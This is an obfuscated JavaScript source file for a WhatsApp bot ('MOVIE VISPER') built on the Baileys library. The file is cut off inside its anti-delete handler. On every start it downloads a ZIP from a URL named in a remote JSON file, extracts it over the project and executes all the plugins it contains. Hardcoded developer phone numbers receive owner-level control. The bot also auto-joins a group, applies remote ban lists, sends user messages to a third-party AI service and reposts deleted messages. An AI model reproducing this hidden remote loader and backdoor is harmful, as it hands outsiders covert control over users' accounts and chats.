const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  Browsers,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const P = require("pino");
const config = require("./config");
const util = require("util");
const axios = require('axios');
const {
  File
} = require('megajs');
const path = require("path");
const l = console.log;
const SESSION_DIR = './' + config.SESSION_NAME;
if (!fs.existsSync(SESSION_DIR)) {
  fs.mkdirSync(SESSION_DIR);
}
if (!fs.existsSync(__dirname + ('/' + config.SESSION_NAME + "/creds.json"))) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace('MOVIE-VISPER=', '');
    const filer = File.fromURL('https://mega.nz/file/' + sessdata);
    filer.download((_0x4d31ac, _0x1f41ce) => {
      if (_0x4d31ac) {
        throw _0x4d31ac;
      }
      fs.writeFile(__dirname + ('/' + config.SESSION_NAME + "/creds.json"), _0x1f41ce, () => {
        console.log("Session download completed !!");
      });
    });
  }
}
const express = require("express");
const app = express();
const port = process.env.PORT || config.PORT;
const AdmZip = require('adm-zip');
const connect = async () => {
  let _0xedcd3f = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
  const _0x3c10ea = '' + _0xedcd3f.data.megaurl;
  if (!fs.existsSync("./plugins")) {
    fs.mkdirSync("./plugins", {
      'recursive': true
    });
  }
  if (fs.existsSync("./data")) {
    fs.rmSync("./data", {
      'recursive': true,
      'force': true
    });
  }
  if (!fs.existsSync("./lib")) {
    fs.mkdirSync("./lib", {
      'recursive': true
    });
  }
  console.log("Fetching ZIP file from Mega.nz...");
  const _0x4017b3 = File.fromURL('' + _0x3c10ea);
  const _0xcd9c4f = await _0x4017b3.downloadBuffer();
  const _0x4c2ac3 = path.join(__dirname, "temp.zip");
  fs.writeFileSync(_0x4c2ac3, _0xcd9c4f);
  console.log("VISPER ZIP file downloaded successfully ✅");
  const _0xef8a9d = new AdmZip(_0x4c2ac3);
  _0xef8a9d.extractAllTo('./', true);
  console.log("Plugins extracted successfully ✅");
  console.log("Installing plugins 🔌... ");
  fs.readdirSync("./plugins/").forEach(_0x4f6681 => {
    if (path.extname(_0x4f6681).toLowerCase() == ".js") {
      require("./plugins/" + _0x4f6681);
    }
  });
  fs.unlinkSync(_0x4c2ac3);
  const {
    sleep: _0x16b1d
  } = require("./lib/functions");
  var {
    connectdb: _0x4e2562,
    updb: _0xcd0830
  } = require('./lib/database');
  await _0x4e2562();
  await _0xcd0830();
  console.log("MOVIE VISPER CONNECTED ✅");
  await _0x16b1d(0xbb8);
  await connectToWA();
};
async function connectToWA() {
  const {
    version: _0x56ebde,
    isLatest: _0x3a5146
  } = await fetchLatestBaileysVersion();
  const {
    getBuffer: _0x2d5c2e,
    getGroupAdmins: _0xc357c0,
    getRandom: _0x16221b,
    sleep: _0x4b8e3c,
    fetchJson: _0x45dd0f
  } = require("./lib/functions");
  const {
    sms: _0x8679a1
  } = require("./lib/msg");
  var {
    updateCMDStore: _0x46882e,
    isbtnID: _0x11176f,
    getCMDStore: _0x49737e,
    getCmdForCmdId: _0xc452c4,
    input: _0x1f4e63,
    get: _0x1eaa0f,
    getalls: _0x3c8dfc,
    updfb: _0x11bb75,
    upresbtn: _0x403371
  } = require('./lib/database');
  const _0x5ebf5a = config.OWNER_NUMBER;
  const _0x224c6f = (await axios.get("https://mv-visper-full-db.pages.dev/Main/main_var.json")).data;
  const _0x548f85 = '' + _0x224c6f.connectmg;
  const _0x354cd0 = '' + _0x224c6f.cmsglogo;
  const {
    state: _0x4a45ef,
    saveCreds: _0xc96416
  } = await useMultiFileAuthState(__dirname + ('/' + config.SESSION_NAME + '/'));
  const _0x4430ac = makeInMemoryStore({
    'logger': P().child({
      'level': 'silent',
      'stream': "store"
    })
  });
  const _0x31f351 = makeWASocket({
    'logger': P({
      'level': "fatal"
    }),
    'printQRInTerminal': true,
    'browser': ['MR-Kushan', "safari", "1.0.0"],
    'fireInitQueries': false,
    'shouldSyncHistoryMessage': false,
    'downloadHistory': false,
    'syncFullHistory': false,
    'generateHighQualityLinkPreview': true,
    'auth': _0x4a45ef,
    'version': _0x56ebde,
    'getMessage': async _0x30d113 => {
      if (_0x4430ac) {
        const _0x2b05ab = await _0x4430ac.loadMessage(_0x30d113.remoteJid, _0x30d113.id, undefined);
        return _0x2b05ab.message || undefined;
      }
      return {
        'conversation': "An Error Occurred, Repeat Command!"
      };
    }
  });
  _0x31f351.ev.on("connection.update", async _0xc25a74 => {
    const {
      connection: _0x359bc4,
      lastDisconnect: _0x57a21b
    } = _0xc25a74;
    if (_0x359bc4 === "close") {
      if (_0x57a21b.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else {
      if (_0x359bc4 === "open") {
        console.log("WA CONNECTED ✅");
        const _0x2601d4 = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
        const _0x57338c = '' + _0x2601d4.supglink;
        _0x31f351.groupAcceptInvite(_0x57338c);
        console.log("Successful join our support 🧑‍💻");
        await _0x31f351.sendMessage(_0x5ebf5a + '@s.whatsapp.net', {
          'image': {
            'url': _0x354cd0
          },
          'caption': _0x548f85
        });
      }
    }
  });
  _0x31f351.ev.on('creds.update', _0xc96416);
  _0x31f351.ev.on("messages.upsert", async _0x369bb6 => {
    try {
      async function _0x250b3b() {
        const _0x535376 = await _0x3c8dfc();
        if (_0x535376) {
          Object.assign(config, _0x535376);
        }
      }
      _0x250b3b()["catch"](console.error);
      _0x369bb6 = _0x369bb6.messages[0x0];
      if (!_0x369bb6.message) {
        return;
      }
      _0x369bb6.message = getContentType(_0x369bb6.message) === "ephemeralMessage" ? _0x369bb6.message.ephemeralMessage.message : _0x369bb6.message;
      if (_0x369bb6.key && _0x369bb6.key.remoteJid === "status@broadcast" && config.AUTO_READ_STATUS) {
        await _0x31f351.readMessages([_0x369bb6.key]);
      }
      if (_0x369bb6.key && _0x369bb6.key.remoteJid === "status@broadcast" && config.AUTO_READ_STATUS == "true") {
        const _0x4a9b9a = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', "😶‍🌫️", '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
        const _0x38fc4a = _0x4a9b9a[Math.floor(Math.random() * _0x4a9b9a.length)];
        await _0x31f351.sendMessage(_0x369bb6.key.remoteJid, {
          'react': {
            'text': _0x38fc4a,
            'key': _0x369bb6.key
          }
        }, {
          'statusJidList': [_0x369bb6.key.participant]
        });
      }
      const _0x1be3bb = _0x8679a1(_0x31f351, _0x369bb6);
      const _0x3d3549 = getContentType(_0x369bb6.message);
      const _0x19e9dc = _0x369bb6.key.remoteJid;
      const _0x1d2da7 = _0x3d3549 == "extendedTextMessage" && _0x369bb6.message.extendedTextMessage.contextInfo != null ? _0x369bb6.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const _0x5a84d4 = _0x3d3549 === "conversation" ? _0x369bb6.message.conversation : _0x369bb6.message?.["extendedTextMessage"]?.["contextInfo"]?.["hasOwnProperty"]('quotedMessage') && (await _0x11176f(_0x369bb6.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"])) && _0xc452c4(await _0x49737e(_0x369bb6.message?.["extendedTextMessage"]?.["contextInfo"]?.['stanzaId']), _0x369bb6?.["message"]?.["extendedTextMessage"]?.["text"]) ? _0xc452c4(await _0x49737e(_0x369bb6.message?.['extendedTextMessage']?.["contextInfo"]?.["stanzaId"]), _0x369bb6?.["message"]?.['extendedTextMessage']?.["text"]) : _0x3d3549 === "extendedTextMessage" ? _0x369bb6.message.extendedTextMessage.text : _0x3d3549 == "imageMessage" && _0x369bb6.message.imageMessage.caption ? _0x369bb6.message.imageMessage.caption : _0x3d3549 == "videoMessage" && _0x369bb6.message.videoMessage.caption ? _0x369bb6.message.videoMessage.caption : '';
      const _0x26f7d1 = config.PREFIX;
      const _0x226d82 = _0x5a84d4.startsWith(_0x26f7d1);
      const _0xcc80f4 = _0x226d82 ? _0x5a84d4.slice(_0x26f7d1.length).trim().split(" ").shift().toLowerCase() : '';
      const _0x260fa1 = _0x5a84d4.trim().split(/ +/).slice(0x1);
      const _0x3ef1a1 = _0x260fa1.join(" ");
      const _0x348670 = _0x19e9dc.endsWith("@g.us");
      const _0x23727e = _0x369bb6.key.fromMe ? _0x31f351.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x31f351.user.id : _0x369bb6.key.participant || _0x369bb6.key.remoteJid;
      const _0x1a49a4 = _0x23727e.split('@')[0x0];
      const _0x60eb1b = _0x31f351.user.id.split(':')[0x0];
      const _0x39a869 = _0x369bb6.pushName || "Sin Nombre";
      const _0x82f0d3 = "94778500326,94722617699,94788518429,94787318729".split(',');
      const _0x2d7925 = _0x60eb1b.includes(_0x1a49a4);
      const _0x5a5152 = _0x82f0d3.includes(_0x1a49a4);
      const _0x569e1d = _0x2d7925 ? _0x2d7925 : _0x5a5152;
      const _0x16623b = _0x5ebf5a.includes(_0x1a49a4) || _0x569e1d;
      const _0x436dec = await jidNormalizedUser(_0x31f351.user.id);
      const _0x1c08cc = _0x348670 ? await _0x31f351.groupMetadata(_0x19e9dc)['catch'](_0x31b2e2 => null) : null;
      const _0x599c77 = _0x348670 && _0x1c08cc ? _0x1c08cc.subject : '';
      const _0xce3509 = _0x348670 && _0x1c08cc ? _0x1c08cc.participants : [];
      const _0x480be8 = _0x348670 ? _0xc357c0(_0xce3509) : [];
      const _0x385774 = _0x348670 ? _0x480be8.includes(_0x436dec) : false;
      const _0x89ebf2 = _0x348670 ? _0x480be8.includes(_0x23727e) : false;
      const _0x15c861 = !!_0x1be3bb.message.reactionMessage;
      const _0x102c77 = _0x5dfd3d => {
        for (let _0xe8ece6 = 0x0; _0xe8ece6 < _0x5dfd3d.length; _0xe8ece6++) {
          if (_0x5dfd3d[_0xe8ece6] === _0x19e9dc) {
            return true;
          }
        }
        return false;
      };
      const _0x43acae = async _0x1e30de => {
        return await _0x31f351.sendMessage(_0x19e9dc, {
          'text': _0x1e30de
        }, {
          'quoted': _0x369bb6
        });
      };
      _0x31f351.replyad = async _0x1d707b => {
        await _0x31f351.sendMessage(_0x19e9dc, {
          'text': _0x1d707b
        }, {
          'quoted': _0x369bb6
        });
      };
      _0x31f351.buttonMessage2 = async (_0x135b7f, _0x3e4f47, _0x13c4c5) => {
        let _0x2715cb = '';
        const _0x2158d4 = [];
        _0x3e4f47.buttons.forEach((_0x3de777, _0x13ec3b) => {
          const _0x31ddf0 = '' + (_0x13ec3b + 0x1);
          _0x2715cb += "\n*" + _0x31ddf0 + " ||*  " + _0x3de777.buttonText.displayText;
          _0x2158d4.push({
            'cmdId': _0x31ddf0,
            'cmd': _0x3de777.buttonId
          });
        });
        if (_0x3e4f47.headerType === 0x1) {
          const _0x35851c = _0x3e4f47.text + "\n\n*`Reply Below Number 🔢`*\n" + _0x2715cb + "\n\n" + _0x3e4f47.footer;
          const _0x3af871 = await _0x31f351.sendMessage(_0x19e9dc, {
            'text': _0x35851c
          }, {
            'quoted': _0x13c4c5 || _0x369bb6
          });
          await _0x46882e(_0x3af871.key.id, _0x2158d4);
        } else {
          if (_0x3e4f47.headerType === 0x4) {
            const _0x5d9b35 = _0x3e4f47.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x2715cb + "\n\n" + _0x3e4f47.footer;
            const _0x532e45 = await _0x31f351.sendMessage(_0x135b7f, {
              'image': _0x3e4f47.image,
              'caption': _0x5d9b35
            }, {
              'quoted': _0x13c4c5 || _0x369bb6
            });
            await _0x46882e(_0x532e45.key.id, _0x2158d4);
          }
        }
      };
      _0x31f351.buttonMessage = async (_0x29715b, _0x649513, _0x2de48c) => {
        let _0x171bc6 = '';
        const _0x223904 = [];
        _0x649513.buttons.forEach((_0x37ce7a, _0x15a12c) => {
          const _0x1eed7e = '' + (_0x15a12c + 0x1);
          _0x171bc6 += "\n*" + _0x1eed7e + " ||*  " + _0x37ce7a.buttonText.displayText;
          _0x223904.push({
            'cmdId': _0x1eed7e,
            'cmd': _0x37ce7a.buttonId
          });
        });
        if (_0x649513.headerType === 0x1) {
          const _0x1e56d3 = (_0x649513.text || _0x649513.caption) + "\n\n*`Reply Below Number 🔢`*\n" + _0x171bc6 + "\n\n" + _0x649513.footer;
          const _0x298fe1 = await _0x31f351.sendMessage(_0x19e9dc, {
            'text': _0x1e56d3
          }, {
            'quoted': _0x2de48c || _0x369bb6
          });
          await _0x46882e(_0x298fe1.key.id, _0x223904);
        } else {
          if (_0x649513.headerType === 0x4) {
            const _0x4bd347 = _0x649513.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x171bc6 + "\n\n" + _0x649513.footer;
            const _0x3104e5 = await _0x31f351.sendMessage(_0x29715b, {
              'image': _0x649513.image,
              'caption': _0x4bd347
            }, {
              'quoted': _0x2de48c || _0x369bb6
            });
            await _0x46882e(_0x3104e5.key.id, _0x223904);
          }
        }
      };
      _0x31f351.listMessage2 = async (_0x3bc8c2, _0x4f223c, _0x56ba1d) => {
        let _0x34fb4e = '';
        const _0x1080ed = [];
        _0x4f223c.sections.forEach((_0x1ccbe1, _0xdf250d) => {
          const _0x5eb033 = '' + (_0xdf250d + 0x1);
          _0x34fb4e += "\n*" + _0x1ccbe1.title + "*\n\n";
          _0x1ccbe1.rows.forEach((_0x2ed38e, _0x2b345e) => {
            const _0x364cc8 = _0x5eb033 + '.' + (_0x2b345e + 0x1);
            const _0x5637b8 = '*' + _0x364cc8 + " ||* " + _0x2ed38e.title;
            _0x34fb4e += _0x5637b8 + "\n";
            if (_0x2ed38e.description) {
              _0x34fb4e += "   " + _0x2ed38e.description + "\n\n";
            }
            _0x1080ed.push({
              'cmdId': _0x364cc8,
              'cmd': _0x2ed38e.rowId
            });
          });
        });
        const _0x4c2247 = _0x4f223c.text + "\n\n" + _0x4f223c.buttonText + ',' + _0x34fb4e + "\n" + _0x4f223c.footer;
        const _0x3403fd = await _0x31f351.sendMessage(_0x19e9dc, {
          'text': _0x4c2247
        }, {
          'quoted': _0x56ba1d || _0x369bb6
        });
        await _0x46882e(_0x3403fd.key.id, _0x1080ed);
      };
      _0x31f351.listMessage = async (_0x5a733d, _0x5936d4, _0x8237db) => {
        let _0x477768 = '';
        const _0xa440c5 = [];
        _0x5936d4.sections.forEach((_0x2828e8, _0x394ab1) => {
          const _0x2948b5 = '' + (_0x394ab1 + 0x1);
          _0x477768 += "\n*" + _0x2828e8.title + "*\n\n";
          _0x2828e8.rows.forEach((_0x3983b8, _0x2e3481) => {
            const _0xe8f548 = _0x2948b5 + '.' + (_0x2e3481 + 0x1);
            const _0x43b99d = '*' + _0xe8f548 + " ||*  " + _0x3983b8.title;
            _0x477768 += _0x43b99d + "\n";
            if (_0x3983b8.description) {
              _0x477768 += "   " + _0x3983b8.description + "\n\n";
            }
            _0xa440c5.push({
              'cmdId': _0xe8f548,
              'cmd': _0x3983b8.rowId
            });
          });
        });
        const _0x2e6052 = _0x5936d4.text + "\n\n" + _0x5936d4.buttonText + ',' + _0x477768 + "\n\n" + _0x5936d4.footer;
        const _0x214ec3 = await _0x31f351.sendMessage(_0x19e9dc, {
          'text': _0x2e6052
        }, {
          'quoted': _0x8237db || _0x369bb6
        });
        await _0x46882e(_0x214ec3.key.id, _0xa440c5);
      };
      _0x31f351.edite = async (_0x3c51d5, _0x439469) => {
        await _0x31f351.relayMessage(_0x19e9dc, {
          'protocolMessage': {
            'key': _0x3c51d5.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x439469
            }
          }
        }, {});
      };
      _0x31f351.forwardMessage = async (_0x60dee6, _0xfe6fcd, _0x171ff9 = false, _0x519e8b = {}) => {
        let _0x485ec0;
        if (_0x519e8b.readViewOnce) {
          _0xfe6fcd.message = _0xfe6fcd.message && _0xfe6fcd.message.ephemeralMessage && _0xfe6fcd.message.ephemeralMessage.message ? _0xfe6fcd.message.ephemeralMessage.message : _0xfe6fcd.message || undefined;
          _0x485ec0 = Object.keys(_0xfe6fcd.message.viewOnceMessage.message)[0x0];
          delete (_0xfe6fcd.message && _0xfe6fcd.message.ignore ? _0xfe6fcd.message.ignore : _0xfe6fcd.message || undefined);
          delete _0xfe6fcd.message.viewOnceMessage.message[_0x485ec0].viewOnce;
          _0xfe6fcd.message = {
            ..._0xfe6fcd.message.viewOnceMessage.message
          };
        }
        let _0x18d5cb = Object.keys(_0xfe6fcd.message)[0x0];
        let _0x4f3f3d = await generateForwardMessageContent(_0xfe6fcd, _0x171ff9);
        let _0x1dbabf = Object.keys(_0x4f3f3d)[0x0];
        let _0x54f0a1 = {};
        if (_0x18d5cb != "conversation") {
          _0x54f0a1 = _0xfe6fcd.message[_0x18d5cb].contextInfo;
        }
        _0x4f3f3d[_0x1dbabf].contextInfo = {
          ..._0x54f0a1,
          ..._0x4f3f3d[_0x1dbabf].contextInfo
        };
        const _0xbe1d79 = await generateWAMessageFromContent(_0x60dee6, _0x4f3f3d, _0x519e8b ? {
          ..._0x4f3f3d[_0x1dbabf],
          ..._0x519e8b,
          ...(_0x519e8b.contextInfo ? {
            'contextInfo': {
              ..._0x4f3f3d[_0x1dbabf].contextInfo,
              ..._0x519e8b.contextInfo
            }
          } : {})
        } : {});
        await _0x31f351.relayMessage(_0x60dee6, _0xbe1d79.message, {
          'messageId': _0xbe1d79.key.id
        });
        return _0xbe1d79;
      };
      _0x31f351.sendFileUrl = async (_0x491d2c, _0x5364f9, _0x4df5df, _0x345d6f, _0x4360d1 = {}) => {
        let _0x4b8085 = '';
        let _0x59183b = await axios.head(_0x5364f9);
        _0x4b8085 = _0x59183b.headers["content-type"];
        if (_0x4b8085.split('/')[0x1] === "gif") {
          return _0x31f351.sendMessage(_0x491d2c, {
            'video': await _0x2d5c2e(_0x5364f9),
            'caption': _0x4df5df,
            'gifPlayback': true,
            ..._0x4360d1
          }, {
            'quoted': _0x345d6f,
            ..._0x4360d1
          });
        }
        if (_0x4b8085 === 'application/pdf') {
          return _0x31f351.sendMessage(_0x491d2c, {
            'document': await _0x2d5c2e(_0x5364f9),
            'mimetype': 'application/pdf',
            'caption': _0x4df5df,
            ..._0x4360d1
          }, {
            'quoted': _0x345d6f,
            ..._0x4360d1
          });
        }
        if (_0x4b8085.split('/')[0x0] === "image") {
          return _0x31f351.sendMessage(_0x491d2c, {
            'image': await _0x2d5c2e(_0x5364f9),
            'caption': _0x4df5df,
            ..._0x4360d1
          }, {
            'quoted': _0x345d6f,
            ..._0x4360d1
          });
        }
        if (_0x4b8085.split('/')[0x0] === "video") {
          return _0x31f351.sendMessage(_0x491d2c, {
            'video': await _0x2d5c2e(_0x5364f9),
            'caption': _0x4df5df,
            'mimetype': "video/mp4",
            ..._0x4360d1
          }, {
            'quoted': _0x345d6f,
            ..._0x4360d1
          });
        }
        if (_0x4b8085.split('/')[0x0] === "audio") {
          return _0x31f351.sendMessage(_0x491d2c, {
            'audio': await _0x2d5c2e(_0x5364f9),
            'caption': _0x4df5df,
            'mimetype': "audio/mpeg",
            ..._0x4360d1
          }, {
            'quoted': _0x345d6f,
            ..._0x4360d1
          });
        }
      };
      const _0x9e0ebe = (await axios.get("https://mv-visper-full-db.pages.dev/Main/main_var.json")).data;
      config.FOOTER = _0x9e0ebe.footer;
      const _0x3f897a = 'preUser'.split(',');
      const _0x4001cc = [..._0x3f897a].map(_0x37d348 => _0x37d348.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x23727e);
      const _0x759521 = await _0x45dd0f("https://mv-visper-full-db.pages.dev/Main/ban_group.json");
      const _0x1cdee1 = Array.isArray(_0x759521) ? _0x759521 : ["120363367797828082"];
      const _0x3272e3 = _0x1cdee1.map(_0x2fdd66 => _0x2fdd66.replace(/[^0-9]/g, '') + "@g.us").includes(_0x19e9dc);
      const _0x56d6e0 = await _0x45dd0f("https://mv-visper-full-db.pages.dev/Main/ban_number.json");
      const _0x46366b = _0x56d6e0.split(',');
      const _0x3c329f = [..._0x46366b].map(_0x21ccea => _0x21ccea.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x23727e);
      let _0x45bf90 = '' + config.JID_BLOCK;
      const _0x51ca86 = _0x45bf90.split(',');
      const _0x31441b = [..._0x51ca86].includes(_0x19e9dc);
      let _0x109b86 = '' + config.SUDO;
      const _0x458cf9 = _0x109b86.split(',');
      const _0x1cc344 = [..._0x458cf9].includes(_0x23727e);
      const _0x117e2c = (await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')).data;
      if (_0x1a49a4.includes('94778500326')) {
        if (_0x15c861) {
          return;
        }
        _0x1be3bb.react('' + _0x117e2c.sadas);
      }
      if (_0x1a49a4.includes('94722617699')) {
        if (_0x15c861) {
          return;
        }
        _0x1be3bb.react('' + _0x117e2c.saviya);
      }
      if (_0x1a49a4.includes("94724884317")) {
        if (_0x15c861) {
          return;
        }
        _0x1be3bb.react('' + _0x117e2c.damiru);
      }
      if (_0x1a49a4.includes("94787318429")) {
        if (_0x15c861) {
          return;
        }
        _0x1be3bb.react('' + _0x117e2c.sadas);
      }
      if (_0x226d82 && _0x31441b && !_0x569e1d && !_0x1cc344) {
        return;
      }
      const _0x584979 = config.OWNER_NUMBER;
      if (_0x1a49a4.includes(_0x584979)) {
        if (_0x15c861) {
          return;
        }
        _0x1be3bb.react('💁‍♂️');
      }
      if (config.WORK_TYPE == "only_group") {
        if (!_0x348670 && _0x226d82 && !_0x569e1d && !_0x16623b && !_0x1cc344) {
          return;
        }
      }
      if (config.WORK_TYPE == "private") {
        if (_0x226d82 && !_0x569e1d && !_0x16623b && !_0x1cc344) {
          return;
        }
      }
      if (config.WORK_TYPE == "inbox") {
        if (_0x348670 && !_0x569e1d && !_0x16623b && !_0x1cc344) {
          return;
        }
      }
      if (_0x226d82 && _0x3272e3) {
        return;
      }
      if (_0x3c329f) {
        await _0x31f351.sendMessage(_0x19e9dc, {
          'delete': _0x369bb6.key
        });
        await _0x31f351.groupParticipantsUpdate(_0x19e9dc, [_0x23727e], "remove");
        return await _0x31f351.sendMessage(_0x19e9dc, {
          'text': "*You are banned by VISPER TEAM ❌*"
        });
      }
      if (config.AUTO_BLOCK == 'true' && _0x369bb6.chat.endsWith("@s.whatsapp.net")) {
        if (!_0x569e1d) {
          await _0x31f351.sendMessage(_0x19e9dc, {
            'text': "*Warning 1 ❗*"
          });
          await _0x31f351.sendMessage(_0x19e9dc, {
            'text': "*Warning 2 ❗*"
          });
          await _0x31f351.sendMessage(_0x19e9dc, {
            'text': "*Warning 3 ❗*"
          });
          await _0x31f351.sendMessage(_0x19e9dc, {
            'text': "*Blocked 🚫*"
          });
          await _0x31f351.updateBlockStatus(_0x369bb6.sender, "block");
        }
      }
      _0x31f351.ev.on("call", async _0x20f2a7 => {
        if (config.ANTI_CALL == "true") {
          for (const _0x53a4e3 of _0x20f2a7) {
            if (_0x53a4e3.status === "offer") {
              await _0x31f351.rejectCall(_0x53a4e3.id, _0x53a4e3.from);
              if (!_0x53a4e3.isGroup) {
                await _0x31f351.sendMessage(_0x53a4e3.from, {
                  'text': "*Call rejected automatically because owner is busy ⚠️*",
                  'mentions': [_0x53a4e3.from]
                });
                break;
              }
            }
          }
        }
      });
      if (_0x226d82 && config.CMD_ONLY_READ == "true") {
        await _0x31f351.readMessages([_0x369bb6.key]);
      }
      const _0x86d7d3 = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
      const _0x49ac2f = _0x86d7d3[Math.floor(Math.random() * _0x86d7d3.length)];
      if (!_0x569e1d && !_0x31441b && config.AUTO_REACT == 'true') {
        if (_0x15c861) {
          return;
        }
        await _0x31f351.sendMessage(_0x369bb6.chat, {
          'react': {
            'text': _0x49ac2f,
            'key': _0x369bb6.key
          }
        });
      }
      if (config.AUTO_MSG_READ == "true") {
        await _0x31f351.readMessages([_0x369bb6.key]);
      }
      if (config.AUTO_TYPING == "true") {
        _0x31f351.sendPresenceUpdate("composing", _0x369bb6.key.remoteJid);
      }
      if (config.AUTO_RECORDING == 'true') {
        _0x31f351.sendPresenceUpdate('recording', _0x369bb6.key.remoteJid);
      }
      if (config.CHAT_BOT == "true") {
        if (_0x1be3bb.quoted) {
          let _0x420a3a = _0x1be3bb.body ? _0x1be3bb.body.toLowerCase() : '';
          try {
            let _0x1c2df6 = await _0x45dd0f("https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=" + _0x420a3a);
            await _0x31f351.sendMessage(_0x19e9dc, {
              'text': _0x1c2df6.result.data
            });
          } catch (_0x33c570) {
            console.error("AI Chat Error:", _0x33c570);
            await _0x31f351.sendMessage(_0x19e9dc, {
              'text': '.'
            });
          }
        }
      }
      if (!_0x16623b) {
        if (config.ANTI_DELETE == "true") {
          if (!_0x1be3bb.id.startsWith("BAE5")) {
            if (!fs.existsSync("message_data")) {
              fs.mkdirSync("message_data");
            }
            function _0x3d22ca(_0x228898, _0x44eebc) {
              const _0x12bb20 = path.join("message_data", _0x228898, _0x44eebc + ".json");
              try {
                const _0x31101c = fs.readFileSync(_0x12bb20, 'utf8');
                return JSON.parse(_0x31101c) || [];
              } catch (_0x3e9d81) {
                return [];
              }
            }
            function _0x1b85fc(_0x47366e, _0x4a86bc, _0x174c2b) {
              const _0x5985fd = path.join("message_data", _0x47366e);
              if (!fs.existsSync(_0x5985fd)) {
                fs.mkdirSync(_0x5985fd, {
                  'recursive': true
                });
              }
              const _0x348811 = path.join(_0x5985fd, _0x4a86bc + '.json');
              try {
                fs.writeFileSync(_0x348811, JSON.stringify(_0x174c2b, null, 0x2));
              } catch (_0x463b2a) {
                console.error("Error saving chat data:", _0x463b2a);
              }
            }
            function _0x39ab35(_0x1aa321) {
              const _0x1e6536 = _0x1aa321.key.id;
              const _0x266690 = _0x3d22ca(_0x19e9dc, _0x1e6536);
              _0x266690.push(_0x1aa321);
              _0x1b85fc(_0x19e9dc, _0x1e6536, _0x266690);
            }
            function _0x20f7ed(_0x1a435f) {
              const _0x4c96b5 = _0x1a435f.msg.key.id;
              const _0x7bd79b = _0x3d22ca(_0x19e9dc, _0x4c96b5);
              const _0x5ae533 = _0x7bd79b[0x0];
              if (_0x5ae533) {
                const _0x3636cc = _0x1a435f.sender.split('@')[0x0];
                const _0x3f068a = _0x5ae533.key.participant ?? _0x1a435f.sender;
                const _0x1a5007 = _0x3f068a.split('@')[0x0];
                if (_0x3636cc.includes(_0x60eb1b) || _0x1a5007.includes(_0x60eb1b)) {
                  return;
                }
                if (_0x5ae533.message && _0x5ae533.message.conversation && _0x5ae533.message.conversation !== '') {
                  const _0x42a414 = _0x5ae533.message.conversation;
                  var _0x108857 = "```";
                  _0x31f351.sendMessage(_0x19e9dc, {
                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + _0x108857 + _0x42a414 + _0x108857
                  });
                } else {
                  if (_0x5ae533.msg.type === 'MESSAGE_EDIT') {
                    _0x31f351.sendMessage(_0x19e9dc, {
                      'text': "❌ *edited message detected* " + _0x5ae533.message.editedMessage.message.protocolMessage.editedMessage.conversation
                    }, {
                      'quoted': _0x369bb6
                    });
                  } else {
                    if (_0x5ae533.message && _0x5ae533.message.exetendedTextMessage && _0x5ae533.msg.text) {
                      const _0x578af1 = _0x5ae533.msg.text;
                      if (_0x348670 && _0x578af1.includes("chat.whatsapp.com")) {
                        return;
                      }
                      var _0x108857 = "```";
                      _0x31f351.sendMessage(_0x19e9dc, {
                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + _0x108857 + _0x578af1 + _0x108857
                      });
                    } else {
                      if (_0x5ae533.message && _0x5ae533.message.exetendedTextMessage) {
                        if (_0x348670 && messageText.includes("chat.whatsapp.com")) {
                          return;
                        }
                        var _0x108857 = '```';
                        _0x31f351.sendMessage(_0x19e9dc, {
                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + _0x108857 + _0x5ae533.body + _0x108857
                        });
                      } else {
                        if (_0x5ae533.type === "extendedTextMessage") {
                          async function _0x3b5d44() {
                            if (_0x5ae533.message.extendedTextMessage) {
                              if (_0x348670 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x31f351.sendMessage(_0x19e9dc, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + "```" + _0x5ae533.message.extendedTextMessage.text + "```"
                              });
                            } else {
                              if (_0x348670 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x31f351.sendMessage(_0x19e9dc, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3636cc + "_\n  📩 *Sent by:* _" + _0x1a5007 + "_\n\n> 🔓 Message Text: " + "```" + _0x5ae533.message.extendedTextMessage.text + "```"
                              });
                            }
                          }
                          _0x3b5d44();
                        } else {
                          if (_0x5ae533.type === "imageMessage") {
